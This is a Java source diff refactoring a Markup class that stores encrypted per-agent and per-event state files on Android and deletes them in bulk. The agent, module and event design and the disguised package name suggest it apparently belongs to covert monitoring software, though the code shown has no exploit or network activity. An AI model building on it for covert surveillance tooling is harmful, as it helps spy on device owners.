@@ -17,15 +17,17 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutput;
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
+import java.util.HashMap;
 
-import com.android.service.agent.AgentType;
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.CryptoException;
 import com.android.service.crypto.Encryption;
 import com.android.service.crypto.Keys;
-import com.android.service.event.EventType;
+
+import com.android.service.event.BaseEvent;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
+import com.android.service.module.BaseModule;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -35,11 +37,11 @@ import com.android.service.util.Utils;
 public class Markup {
 
 	private static final String TAG = "Markup"; //$NON-NLS-1$
- //$NON-NLS-1$
-	public static final String MARKUP_EXTENSION = ".qmm"; //$NON-NLS-1$
+	//$NON-NLS-1$
+	public static final String MARKUP_EXTENSION = ".mm"; //$NON-NLS-1$
 	public static byte markupSeed;
 	public static boolean markupInit;
-	private String agentId = "core"; //$NON-NLS-1$
+	private String markupId = "core"; //$NON-NLS-1$
 
 	private String lognName;
 	private AutoFile file;
@@ -57,14 +59,32 @@ public class Markup {
 	 * @param aesKey
 	 *            the aes key
 	 */
-	public Markup(final String agentId_) {
+	protected Markup(final String agentId_) {
 		this();
-		agentId = agentId_;
+		markupId = agentId_;
 	}
 
 	public Markup(final Integer id) {
 		this();
-		agentId = id.toString();
+		markupId = id.toString();
+	}
+
+	protected Markup(final String string, int num) {
+		this();
+		markupId = string + num;
+
+	}
+
+	public Markup(BaseEvent event) {
+		this("EVT" + event.getType(), event.getId());
+	}
+	
+	public Markup(BaseModule event) {
+		this("AGN" + event.getType());
+	}
+	
+	public Markup(BaseModule event, int id) {
+		this("EVT" + event.getType(), id);
 	}
 
 	/**
@@ -80,6 +100,7 @@ public class Markup {
 	 * 
 	 * @param agentId
 	 *            the agent id
+	 * @param num
 	 * @param addPath
 	 *            the add path
 	 * @return the string
@@ -118,37 +139,6 @@ public class Markup {
 	}
 
 	/**
-	 * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
-	 * TRUE se il file e' stato rimosso o non e' stato trovato, FALSE se non e'
-	 * stato possibile rimuoverlo.
-	 * 
-	 * @param value
-	 *            the agent id_
-	 * @return
-	 */
-
-	public static synchronized boolean removeMarkup(final String value) {
-
-		final String markupName = makeMarkupName(value, true);
-
-		if (Cfg.DEBUG) {
-			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
-
-		final AutoFile file = new AutoFile(markupName);
-		if (file.exists()) {
-			file.delete();
-			return true;
-		} else {
-			return false;
-		}
-	}
-
-	public static boolean removeMarkup(final Integer value) {
-		return removeMarkup(value.toString());
-	}
-
-	/**
 	 * Rimuove tutti i file di markup presenti sul filesystem.
 	 * 
 	 * @return
@@ -157,25 +147,15 @@ public class Markup {
 	public static synchronized int removeMarkups() {
 
 		int numDeleted = 0;
-		for (final int type : AgentType.values()) {
-			if (removeMarkup(type)) {
-				numDeleted++;
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (removeMarkups): " + type) ;//$NON-NLS-1$
-				}
-			}
-		}
 
-		for (final int type : EventType.values()) {
-			if (removeMarkup(type)) {
-				numDeleted++;
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (removeMarkups): " + type) ;//$NON-NLS-1$
-				}
-			}
+		AutoFile dir = new AutoFile(Path.markup());
+		String[] list = dir.list();
+		for (String filename : list) {
+			AutoFile file = new AutoFile(Path.markup(), filename);
+			file.delete();
+			numDeleted++;
 		}
+		//dir.delete();
 
 		return numDeleted;
 	}
@@ -187,9 +167,9 @@ public class Markup {
 	 */
 	public synchronized boolean isMarkup() {
 		if (Cfg.DEBUG) {
-			Check.requires(agentId != null, "agentId null"); //$NON-NLS-1$
+			Check.requires(markupId != null, "agentId null"); //$NON-NLS-1$
 		}
-		final String markupName = makeMarkupName(agentId, true);
+		final String markupName = makeMarkupName(markupId, true);
 		if (Cfg.DEBUG) {
 			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -212,10 +192,10 @@ public class Markup {
 	 */
 	public synchronized byte[] readMarkup() throws IOException {
 		if (Cfg.DEBUG) {
-			Check.requires(agentId != null, "agentId null"); //$NON-NLS-1$
+			Check.requires(markupId != null, "agentId null"); //$NON-NLS-1$
 		}
 
-		final String markupName = makeMarkupName(agentId, true);
+		final String markupName = makeMarkupName(markupId, true);
 		if (Cfg.DEBUG) {
 			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -243,7 +223,7 @@ public class Markup {
 			return plain;
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (readMarkup): Markup file does not exists") ;//$NON-NLS-1$
+				Check.log(TAG + " Error (readMarkup): Markup file does not exists");//$NON-NLS-1$
 			}
 			return null;
 		}
@@ -254,10 +234,10 @@ public class Markup {
 	 */
 	public synchronized void removeMarkup() {
 		if (Cfg.DEBUG) {
-			Check.requires(agentId != null, "agentId null"); //$NON-NLS-1$
+			Check.requires(markupId != null, "agentId null"); //$NON-NLS-1$
 		}
 
-		final String markupName = makeMarkupName(agentId, true);
+		final String markupName = makeMarkupName(markupId, true);
 		if (Cfg.DEBUG) {
 			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -276,10 +256,11 @@ public class Markup {
 	 * 
 	 * @param data
 	 *            the data
+	 * @param num
 	 * @return true, if successful
 	 */
 	public synchronized boolean writeMarkup(final byte[] data) {
-		final String markupName = makeMarkupName(agentId, true);
+		final String markupName = makeMarkupName(markupId, true);
 
 		if (Cfg.DEBUG) {
 			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -307,14 +288,12 @@ public class Markup {
 		return fileRet.exists();
 	}
 
-	public synchronized boolean writeMarkupSerializable(final Serializable object) throws IOException {
-
+	public boolean writeMarkupSerializable(final Serializable object) throws IOException {
 		final ByteArrayOutputStream bos = new ByteArrayOutputStream();
 		final ObjectOutput out = new ObjectOutputStream(bos);
 		out.writeObject(object);
 		final byte[] data = bos.toByteArray();
 		return writeMarkup(data);
-
 	}
 
 	public synchronized Object readMarkupSerializable() throws IOException {
@@ -326,7 +305,7 @@ public class Markup {
 			return o;
 		} catch (final ClassNotFoundException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (readMarkupSerializable): " + e) ;//$NON-NLS-1$
+				Check.log(TAG + " Error (readMarkupSerializable): " + e);//$NON-NLS-1$
 			}
 			throw new IOException();
 		}
